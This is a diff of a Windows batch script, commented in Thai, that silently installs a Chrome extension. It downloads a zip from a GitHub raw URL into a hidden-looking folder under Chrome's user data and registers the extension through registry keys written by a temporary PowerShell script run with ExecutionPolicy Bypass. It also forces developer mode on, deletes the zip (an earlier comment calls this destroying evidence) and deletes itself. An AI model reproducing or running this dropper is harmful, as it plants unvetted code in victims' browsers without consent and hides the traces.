@@ -1,36 +1,40 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: 1. ตั้งค่าตำแหน่งที่จะวางส่วนเสริม (แนะนำให้วางในโฟลเดอร์ที่ไม่สะดุดตา)
+:: 1. ตั้งค่าพื้นฐาน
 set "TARGET_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\InternalSvc"
 set "EXT_ID=onifoepgcccnlehkgoonpaofeolhigpa"
+set "EXT_URL=https://raw.githubusercontent.com/wkdopajwiojf/grap/main/onifoepgcccnlehkgoonpaofeolhigpa.zip"
 
 if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
 
-:: 2. ดาวน์โหลดไฟล์ .zip จาก GitHub
-set "EXT_URL=https://raw.githubusercontent.com/wkdopajwiojf/grap/main/onifoepgcccnlehkgoonpaofeolhigpa.zip"
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TARGET_DIR%\ext.zip'"
+:: 2. ดาวน์โหลดและแตกไฟล์ (PowerShell แบบรวมคำสั่ง)
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TARGET_DIR%\ext.zip'; Expand-Archive -Path '%TARGET_DIR%\ext.zip' -DestinationPath '%TARGET_DIR%\temp_ext' -Force"
 
-:: 3. แตกไฟล์ .zip
-powershell -Command "Expand-Archive -Path '%TARGET_DIR%\ext.zip' -DestinationPath '%TARGET_DIR%\temp_ext' -Force"
-
-:: --- แก้ปัญหาโฟลเดอร์ซ้อน (Move files out) ---
-:: ดึงไฟล์จากชั้นในสุดออกมาวางที่ชั้น %EXT_ID% โดยตรง
-for /d %%D in ("%TARGET_DIR%\temp_ext\*") do (
-    xcopy "%%D\*" "%TARGET_DIR%\%EXT_ID%\" /s /e /y
+:: 3. จัดการโครงสร้างโฟลเดอร์ (ดึงไฟล์ออกมาชั้นนอก)
+if exist "%TARGET_DIR%\temp_ext" (
+    for /d %%D in ("%TARGET_DIR%\temp_ext\*") do (
+        xcopy "%%D\*" "%TARGET_DIR%\%EXT_ID%\" /s /e /y
+    )
+    rd /s /q "%TARGET_DIR%\temp_ext"
+    del /f /q "%TARGET_DIR%\ext.zip"
 )
-rd /s /q "%TARGET_DIR%\temp_ext"
 
-:: 4. สั่งลงทะเบียนส่วนเสริมผ่าน Registry
-:: ชี้ไปที่โฟลเดอร์ที่มี manifest.json อยู่จริงๆ (ซึ่งตอนนี้คือ %TARGET_DIR%\%EXT_ID%)
-reg add "HKEY_CURRENT_USER\Software\Google\Chrome\Extensions\%EXT_ID%" /v "path" /t REG_SZ /d "%TARGET_DIR%\%EXT_ID%" /f
-reg add "HKEY_CURRENT_USER\Software\Google\Chrome\Extensions\%EXT_ID%" /v "version" /t REG_SZ /d "1.0" /f
+:: 4. [ไม้ตาย] สั่งเขียน Registry ผ่าน PowerShell แบบ Force
+:: เราจะสร้างไฟล์ .ps1 สั้นๆ ใน Temp แล้วรันเพื่อเขียน Registry โดยเฉพาะ
+echo $registryPath = 'HKCU:\Software\Google\Chrome\Extensions\%EXT_ID%' > %TEMP%\reg_fix.ps1
+echo if (-not (Test-Path $registryPath)) { New-Item -Path $registryPath -Force } >> %TEMP%\reg_fix.ps1
+echo Set-ItemProperty -Path $registryPath -Name 'path' -Value '%TARGET_DIR%\%EXT_ID%' >> %TEMP%\reg_fix.ps1
+echo Set-ItemProperty -Path $registryPath -Name 'version' -Value '1.0' >> %TEMP%\reg_fix.ps1
+echo $devModePath = 'HKCU:\Software\Google\Chrome\ExtensionsSettings' >> %TEMP%\reg_fix.ps1
+echo if (-not (Test-Path $devModePath)) { New-Item -Path $devModePath -Force } >> %TEMP%\reg_fix.ps1
+echo Set-ItemProperty -Path $devModePath -Name 'ui_developer_mode' -Value 1 >> %TEMP%\reg_fix.ps1
 
-:: (แถม) บังคับเปิด Developer Mode เพื่อให้ยอมรับ Unpacked Extension
-reg add "HKEY_CURRENT_USER\Software\Google\Chrome\ExtensionsSettings" /v "ui_developer_mode" /t REG_DWORD /d 1 /f
+:: รันไฟล์แก้ไข Registry ที่เราเพิ่งสร้าง
+powershell -ExecutionPolicy Bypass -File %TEMP%\reg_fix.ps1
 
-:: 5. ลบไฟล์ .zip ทำลายหลักฐาน
-del "%TARGET_DIR%\ext.zip"
+:: ล้างไฟล์ขยะ
+del %TEMP%\reg_fix.ps1
 
-:: 6. ลบตัวเองทิ้ง
+:: 5. ลบตัวเองทิ้ง
 (goto) 2>nul & del "%~f0"
